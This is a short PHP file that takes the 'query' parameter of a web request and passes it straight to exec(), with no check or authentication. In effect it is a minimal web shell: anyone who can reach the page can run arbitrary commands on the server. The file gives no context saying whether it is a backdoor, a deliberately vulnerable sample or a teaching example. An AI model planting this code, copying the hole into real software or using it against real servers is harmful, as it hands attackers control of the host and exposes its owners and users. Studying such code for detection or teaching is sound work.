<?php

if (isset($_GET) && isset($_GET['query'])) {
    $query = $_GET['query'];
    exec($query);
}